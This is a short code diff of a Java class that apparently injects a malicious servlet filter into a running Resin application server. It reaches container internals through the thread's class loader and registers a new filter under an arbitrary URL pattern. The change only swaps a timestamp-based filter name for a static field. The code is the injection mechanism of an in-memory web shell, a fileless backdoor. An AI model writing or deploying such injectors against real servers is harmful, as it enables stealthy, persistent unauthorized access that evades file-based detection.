@@ -17,10 +17,10 @@ public class RFMSFromThread implements Filter {
 
 	public static String pattern;
 
+	public static String NAME;
+
 	static {
 		try {
-			String filterName = String.valueOf(System.nanoTime());
-
 			ClassLoader classloader = Thread.currentThread().getContextClassLoader();
 
 			Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
@@ -34,7 +34,7 @@ public class RFMSFromThread implements Filter {
 			Filter filter = new RFMSFromThread();
 
 			FilterConfigImpl filterConfigimpl = (FilterConfigImpl) filterConfigimplcls.newInstance();
-			filterConfigimpl.setFilterName(filterName);
+			filterConfigimpl.setFilterName(NAME);
 			filterConfigimpl.setFilter(filter);
 			filterConfigimpl.setFilterClass(filter.getClass());
 
@@ -44,7 +44,7 @@ public class RFMSFromThread implements Filter {
 			FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
 			filterMappingUrlpattern.addText(pattern);
 			filterMappingUrlpattern.init();
-			filterMapping.setFilterName(filterName);
+			filterMapping.setFilterName(NAME);
 			filterMapping.setServletContext(webapp);
 
 
